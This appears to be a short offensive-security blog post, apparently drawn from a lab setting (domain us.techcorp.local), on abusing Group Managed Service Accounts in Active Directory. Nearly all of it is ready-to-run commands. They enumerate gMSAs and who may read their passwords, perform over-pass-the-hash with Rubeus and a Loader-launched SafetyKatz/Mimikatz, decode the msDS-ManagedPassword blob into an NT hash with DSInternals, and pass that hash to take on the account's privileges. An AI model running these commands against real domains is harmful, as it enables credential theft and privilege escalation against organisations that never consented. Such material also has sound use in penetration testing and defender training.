---
layout: post
date: 26/11/2022
author: Aswin Gopalakrishnan
title:  Group Managed Service Accounts (gMSA) Abuse
---

A group Managed Service Account (gMSA) provides automatic password management, SPN management, and delegated administration for service accounts across multiple servers.

## Enumerate gMSAs and User

A gMSA has objectclass `msDS-GroupManagedServiceAccount`. This can be used to find gMSA accounts.

1.Find gMSAs in the domain. 
```bash
Get-ADServiceAccount -Filter *
Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'
```
2.Find the users/principals who have permissions to read the password. In this case, to read gMSA password of `jumpone` service account.
```bash
Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword`
``` 

## Over Pass-the-Hash

1. Using Rubeus
```bash
Rubeus.exe asktgt /user:provisioningsvc /aes256:a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a /domain:us.techcorp.local /createnetonly:C:\Windows\System32\cmd.exe /show
```
2. Using Loader and Mimikatz
```bash
.\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe "Sekurlsa::pth /user:provisioningsvc /domain:us.techcorp.local /aes256:a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a /run:cmd.exe" "exit"`
- `sekurlsa::opassth
```
3. Fetch Password Blob
```bash
$Passwordblob = (Get-ADServiceAccount -Identity jumpone -Properties msDS-ManagedPassword).'msDS-ManagedPassword'
Import-Module C:\AD\Tools\DSInternals_v4.7\DSInternals\DSInternals.psd1
$decodedpwd = ConvertFrom-ADManagedPasswordBlob $Passwordblob
ConvertTo-NTHash -Password $decodedpwd.SecureCurrentPassword`
```
The attribute `msDS-ManagedPassword` stores the password blob in binary form of `MSDS-MANAGEDPASSWORD_BLOB`. Once we have compromised a principal that can read the blob, use ADModule to read and DSInternals to compute NTLM hash.
4. Pass-the-hash and get priveleges of gMSA
```bash
sekurlsa::pth /user:jumpone /domain:us.techcorp.local /ntlm:0a02c684cc0fa1744195edd1aec43078
```
